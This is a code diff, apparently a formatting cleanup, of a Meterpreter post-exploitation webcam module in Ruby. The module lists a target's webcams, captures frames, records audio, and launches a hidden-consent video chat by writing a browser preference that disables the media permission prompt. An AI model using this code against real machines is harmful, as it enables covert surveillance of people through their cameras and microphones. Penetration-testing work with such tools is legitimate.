@@ -1,7 +1,5 @@
 # -*- coding: binary -*-
 
-#require 'rex/post/meterpreter/extensions/process'
-
 module Rex
 module Post
 module Meterpreter
@@ -15,7 +13,6 @@ module Webcam
 #
 ###
 class Webcam
-
   include Msf::Post::Common
   include Msf::Post::File
   include Msf::Post::WebRTC
@@ -31,9 +28,9 @@ class Webcam
   def webcam_list
     response = client.send_request(Packet.create_request('webcam_list'))
     names = []
-    response.get_tlvs( TLV_TYPE_WEBCAM_NAME ).each{ |tlv|
+    response.get_tlvs(TLV_TYPE_WEBCAM_NAME).each do |tlv|
       names << tlv.value
-    }
+    end
     names
   end
 
@@ -49,11 +46,11 @@ class Webcam
     request = Packet.create_request('webcam_get_frame')
     request.add_tlv(TLV_TYPE_WEBCAM_QUALITY, quality)
     response = client.send_request(request)
-    response.get_tlv( TLV_TYPE_WEBCAM_IMAGE ).value
+    response.get_tlv(TLV_TYPE_WEBCAM_IMAGE).value
   end
 
   def webcam_stop
-    client.send_request( Packet.create_request( 'webcam_stop' )  )
+    client.send_request(Packet.create_request('webcam_stop'))
     true
   end
 
@@ -67,13 +64,13 @@ class Webcam
     offerer_id = Rex::Text.rand_text_alphanumeric(10)
     channel    = Rex::Text.rand_text_alphanumeric(20)
 
-    remote_browser_path = get_webrtc_browser_path
+    remote_browser_path = webrtc_browser_path
 
     if remote_browser_path.blank?
-      raise "Unable to find a suitable browser on the target machine"
+      fail "Unable to find a suitable browser on the target machine"
     end
 
-    ready_status = init_video_chat(remote_browser_path, server, channel, offerer_id)
+    init_video_chat(remote_browser_path, server, channel, offerer_id)
     connect_video_chat(server, channel, offerer_id)
   end
 
@@ -83,21 +80,19 @@ class Webcam
     request = Packet.create_request('webcam_audio_record')
     request.add_tlv(TLV_TYPE_AUDIO_DURATION, duration)
     response = client.send_request(request)
-    response.get_tlv( TLV_TYPE_AUDIO_DATA ).value
+    response.get_tlv(TLV_TYPE_AUDIO_DATA).value
   end
 
   attr_accessor :client
 
-
   private
-
 
   #
   # Returns a browser path that supports WebRTC
   #
   # @return [String]
   #
-  def get_webrtc_browser_path
+  def webrtc_browser_path
     found_browser_path = ''
 
     case client.platform
@@ -125,7 +120,7 @@ class Webcam
     when /osx|bsd/
       [
         '/Applications/Google Chrome.app',
-        '/Applications/Firefox.app',
+        '/Applications/Firefox.app'
       ].each do |browser_path|
         if file?(browser_path)
           found_browser_path = browser_path
@@ -140,7 +135,6 @@ class Webcam
 
     found_browser_path
   end
-
 
   #
   # Creates a video chat session as an offerer... involuntarily :-p
@@ -177,7 +171,7 @@ class Webcam
       profile_name = Rex::Text.rand_text_alpha(8)
       o = cmd_exec("#{remote_browser_path} --CreateProfile #{profile_name} #{tmp_dir}\\#{profile_name}")
       profile_path = (o.scan(/created profile '.+' at '(.+)'/).flatten[0] || '').strip
-      setting = %Q|user_pref("media.navigator.permission.disabled", true);|
+      setting = %|user_pref("media.navigator.permission.disabled", true);|
       begin
         write_file(profile_path, setting)
       rescue ::Exception => e
@@ -187,7 +181,7 @@ class Webcam
       args = "-p #{profile_name}"
     end
 
-    exec_opts = {'Hidden' => false, 'Channelized' => false}
+    exec_opts = { 'Hidden' => false, 'Channelized' => false }
 
     begin
       session.sys.process.execute(remote_browser_path, "#{args} #{tmp_dir}\\interface.html", exec_opts)
